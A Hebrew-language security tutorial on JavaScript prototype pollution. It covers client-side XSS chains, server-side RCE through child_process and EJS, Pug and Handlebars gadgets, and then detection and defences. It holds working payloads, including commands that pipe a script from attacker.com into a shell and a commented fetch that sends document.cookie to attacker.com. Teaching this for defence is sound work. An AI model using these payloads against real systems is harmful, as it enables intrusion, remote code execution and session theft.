# זיהום פרוטוטייפ - Prototype Pollution

## שרשרת הפרוטוטייפ ב-JavaScript

ב-JavaScript, כל אובייקט יורש מאובייקט אב דרך שרשרת הפרוטוטייפ (prototype chain). כאשר ניגשים לתכונה של אובייקט, המנוע מחפש אותה קודם באובייקט עצמו, ואם לא נמצאה - עולה בשרשרת הפרוטוטייפ עד ל-`Object.prototype`.

```javascript
let obj = {};
console.log(obj.toString); // found on Object.prototype

// the prototype chain
// obj -> Object.prototype -> null

let arr = [];
// arr -> Array.prototype -> Object.prototype -> null
```

הגישה ל-prototype של אובייקט:

```javascript
let obj = {};

// three ways to access the prototype
obj.__proto__                    // the old way
Object.getPrototypeOf(obj)       // the modern way
obj.constructor.prototype        // via the constructor
```

---

## מהו זיהום פרוטוטייפ - Prototype Pollution

הpollution פרוטוטייפ מתרחש כאשר תוקף מצליח לשנות את `Object.prototype`, ובכך משפיע על כל האובייקטים במערכת:

```javascript
// basic pollution
let obj = {};
obj.__proto__.isAdmin = true;

// now every new object "inherits" isAdmin
let user = {};
console.log(user.isAdmin); // true!

let config = {};
console.log(config.isAdmin); // true!
```

---

## הpollution פרוטוטייפ בצד הלקוח

### הpollution דרך פרמטרי URL

אתרים רבים מפרסרים פרמטרים מה-URL לתוך אובייקט:

```javascript
// vulnerable function for parsing parameters
function parseParams(url) {
  let params = new URLSearchParams(url);
  let result = {};
  for (let [key, value] of params) {
    setValue(result, key, value);
  }
  return result;
}

function setValue(obj, key, value) {
  let keys = key.split('.');
  let current = obj;
  for (let i = 0; i < keys.length - 1; i++) {
    if (!current[keys[i]]) current[keys[i]] = {};
    current = current[keys[i]];
  }
  current[keys[keys.length - 1]] = value;
}
```

נתיב תקיפה:

```
https://example.com/page?__proto__.isAdmin=true
https://example.com/page?constructor.prototype.isAdmin=true
```

### הpollution דרך JSON.parse עם פעולות מיזוג

```javascript
// vulnerable merge function
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// JSON sent by the attacker
let maliciousJSON = '{"__proto__": {"isAdmin": true}}';
let parsed = JSON.parse(maliciousJSON);

let config = {};
merge(config, parsed);

// now every object is polluted
let user = {};
console.log(user.isAdmin); // true
```

### הpollution דרך פונקציות deep merge/extend/clone

ספריות רבות מכילות פונקציות מיזוג עמוק פגיעות:

```javascript
// lodash (older versions) - _.merge, _.defaultsDeep
const _ = require('lodash');
let target = {};
_.merge(target, JSON.parse('{"__proto__": {"polluted": true}}'));

// jQuery (older versions) - $.extend
$.extend(true, {}, JSON.parse('{"__proto__": {"polluted": true}}'));

// verify the pollution
let test = {};
console.log(test.polluted); // true
```

---

### מציאת gadgets בספריות

gadget הוא קוד קיים שמשתמש בתכונה מפרוטוטייפ בצורה שניתן לנצל:

```javascript
// gadget in jQuery - adds HTML properties from Object.prototype
// if innerHTML is defined on Object.prototype, jQuery will use it
Object.prototype.innerHTML = '';

// gadget in lodash template
Object.prototype.sourceURL = '\n;alert(1)//';

// common gadget - data-* attributes
Object.prototype['data-template'] = '';
```

### הpollution פרוטוטייפ ל-XSS

הchaining מלא מpollution ל-XSS:

```javascript
// step 1: pollution via URL
// https://example.com/page?__proto__[transport_url]=data:,alert(1)//

// step 2: the vulnerable code on the page
let config = {};
// config.transport_url is not defined, so JavaScript walks up the prototype chain
let scriptUrl = config.transport_url || '/default/transport.js';

// step 3: loading the script
let s = document.createElement('script');
s.src = scriptUrl; // data:,alert(1)//
document.body.appendChild(s);
```

דוגמה נוספת עם innerHTML:

```javascript
// pollution
// ?__proto__[innerText]=

// gadget - code that reads a property and uses it
function renderWidget(element, options) {
  let html = options.template || element.innerText;
  element.innerHTML = html; // XSS!
}
```

---

## הpollution פרוטוטייפ בצד השרת - Node.js

### הpollution דרך פרסור JSON body

```javascript
// Express server with a vulnerable merge function
const express = require('express');
const app = express();
app.use(express.json());

function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}

app.post('/api/update', (req, res) => {
  let settings = {};
  merge(settings, req.body); // vulnerable!
  res.json({ status: 'updated' });
});
```

בקשת תקיפה:

```http
POST /api/update HTTP/1.1
Content-Type: application/json

{
  "__proto__": {
    "isAdmin": true
  }
}
```

### דריסת קוד סטטוס - Status Code Override

טכניקה לזיהוי pollution פרוטוטייפ בצד שרת:

```http
POST /api/update HTTP/1.1
Content-Type: application/json

{
  "__proto__": {
    "status": 555
  }
}
```

אם Express משתמש ב-`res.status(obj.status || 200)` ו-`obj.status` לא מוגדר, הוא יקרא מהפרוטוטייפ ויחזיר status code 555.

### דריסת JSON spaces לזיהוי

```http
POST /api/update HTTP/1.1
Content-Type: application/json

{
  "__proto__": {
    "json spaces": 10
  }
}
```

אם Express משתמש ב-`res.json()`, הוא ישתמש ב-`json spaces` מהפרוטוטייפ וה-JSON בתגובה יהיה עם 10 רווחים במקום ברירת המחדל.

### דריסת charset

```http
POST /api/update HTTP/1.1
Content-Type: application/json

{
  "__proto__": {
    "content-type": "application/json; charset=utf-7"
  }
}
```

---

### הpollution פרוטוטייפ ל-RCE

#### הinjection משתני סביבה דרך child_process

```javascript
// pollution
Object.prototype.env = {
  NODE_OPTIONS: '--require=/proc/self/environ'
};
Object.prototype.shell = true;

// when the code runs child_process
const { execSync } = require('child_process');
execSync('ls'); // uses env and shell from the prototype
```

תקיפה מלאה:

```http
POST /api/update HTTP/1.1
Content-Type: application/json

{
  "__proto__": {
    "shell": "node",
    "NODE_OPTIONS": "--require /proc/self/cmdline"
  }
}
```

#### הinjection דרך child_process.execSync/spawn

```javascript
// pollution
Object.prototype.shell = true;
Object.prototype.argv0 = "node -e require('child_process').execSync('curl attacker.com/shell|sh')";

// or
Object.prototype.env = {
  "BASH_FUNC_echo%%": "() { id; }"
};
```

### gadgets במנועי תבניות - Template Engines

#### EJS (Embedded JavaScript)

```http
POST /api/update HTTP/1.1
Content-Type: application/json

{
  "__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"
  }
}
```

כאשר EJS מרנדר תבנית, הוא משתמש ב-`outputFunctionName` ומזריק את הקוד:

```javascript
// the code generated inside EJS
var x;process.mainModule.require('child_process').execSync('id');s = '';
// ... RCE!
```

#### Pug

```http
POST /api/update HTTP/1.1
Content-Type: application/json

{
  "__proto__": {
    "block": {
      "type": "Text",
      "val": "x]});process.mainModule.require('child_process').execSync('id');//"
    }
  }
}
```

#### Handlebars

```http
POST /api/update HTTP/1.1
Content-Type: application/json

{
  "__proto__": {
    "main": "\n} };\nprocess.mainModule.require('child_process').execSync('id');\n//",
    "layout": true
  }
}
```

---

## פונקציית מיזוג פגיעה - ניתוח מפורט

```javascript
// vulnerable function
function isObject(obj) {
  return obj !== null && typeof obj === 'object';
}

function deepMerge(target, source) {
  for (let key in source) {
    // the problem: not checking if key is __proto__ or constructor
    if (isObject(source[key])) {
      if (!isObject(target[key])) {
        target[key] = {};
      }
      deepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// exploit
let malicious = JSON.parse('{"__proto__": {"polluted": "yes"}}');
let obj = {};
deepMerge(obj, malicious);

console.log({}.polluted); // "yes" - all objects are polluted!
```

---

## שרשרת exploit מלאה - צד לקוח

```javascript
// step 1: finding an injection point
// URL: https://vulnerable.com/page?__proto__[transport_url]=//attacker.com/evil.js

// step 2: the vulnerable code parses the URL
function getConfig() {
  let params = new URLSearchParams(location.search);
  let config = {};
  for (let [key, value] of params) {
    let keys = key.replace(/\]/g, '').split('[');
    let current = config;
    for (let i = 0; i < keys.length - 1; i++) {
      if (!current[keys[i]]) current[keys[i]] = {};
      current = current[keys[i]];
    }
    current[keys[keys.length - 1]] = value;
  }
  return config;
}

// step 3: gadget that loads a script
function initAnalytics(config) {
  let url = config.analyticsUrl; // undefined, walks up to the prototype
  if (url) {
    let script = document.createElement('script');
    script.src = url;
    document.head.appendChild(script);
  }
}

// step 4: evil.js on the attacker's server
// fetch('https://attacker.com/steal?cookie=' + document.cookie)
```



---

## שרשרת exploit מלאה - צד שרת

```javascript
// step 1: finding an endpoint with merge
// POST /api/profile

// step 2: prototype pollution
// {"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('curl attacker.com/shell.sh|bash');s"}}

// step 3: trigger - when EJS renders a page
// GET /dashboard -> EJS render -> RCE

// step 4: reverse shell reaches the attacker's server
```

---

## טכניקות זיהוי - Detection

### בדיקת property descriptors

```javascript
// check whether the prototype is polluted
function checkPollution() {
  let testObj = {};
  let suspicious = [];

  for (let key in testObj) {
    if (testObj.hasOwnProperty(key) === false) {
      // a property that doesn't belong to the object itself - suspicious
      if (!['toString', 'valueOf', 'hasOwnProperty', 'constructor',
           'isPrototypeOf', 'propertyIsEnumerable', 'toLocaleString',
           '__defineGetter__', '__defineSetter__', '__lookupGetter__',
           '__lookupSetter__', '__proto__'].includes(key)) {
        suspicious.push(key);
      }
    }
  }

  return suspicious;
}

console.log(checkPollution()); // ['isAdmin', 'polluted', ...]
```

### סריקה אוטומטית

```javascript
// script to check for prototype pollution via URL
async function testPrototypePollution(baseUrl, paramFormats) {
  let formats = paramFormats || [
    '__proto__[test]=polluted',
    '__proto__.test=polluted',
    'constructor[prototype][test]=polluted',
    'constructor.prototype.test=polluted'
  ];

  for (let format of formats) {
    let url = `${baseUrl}?${format}`;
    console.log(`[*] Testing: ${url}`);
    // send a request and check whether the prototype is polluted
  }
}
```

---

## הגנה

### שימוש ב-Object.create(null)

```javascript
// an object with no prototype - immune to pollution
let safeObj = Object.create(null);
console.log(safeObj.__proto__); // undefined
```

### הקפאת Object.prototype

```javascript
// prevents changes to Object.prototype
Object.freeze(Object.prototype);

let obj = {};
obj.__proto__.polluted = true;
console.log({}.polluted); // undefined - the freeze prevented the pollution
```

### ולידציית קלט

```javascript
// safe merge function
function safeMerge(target, source) {
  for (let key of Object.keys(source)) {
    // block dangerous keys
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;
    }

    if (typeof source[key] === 'object' && source[key] !== null && !Array.isArray(source[key])) {
      if (typeof target[key] !== 'object') {
        target[key] = {};
      }
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

### שימוש ב-Map במקום אובייקט רגיל

```javascript
// Map is not vulnerable to prototype pollution
let config = new Map();
config.set('isAdmin', false);
console.log(config.get('isAdmin')); // false - not affected by the prototype
```

---

## סיכום

הpollution פרוטוטייפ הוא חולשה ייחודית ל-JavaScript שמנצלת את מנגנון הירושה של השפה. בצד הלקוח, ניתן להגיע ל-XSS דרך gadgets ב-DOM. בצד השרת ב-Node.js, ניתן להגיע ל-RCE דרך מנועי תבניות ו-child_process. ההגנה דורשת שילוב של ולידציית קלט, שימוש ב-Object.create(null), והקפאת Object.prototype.
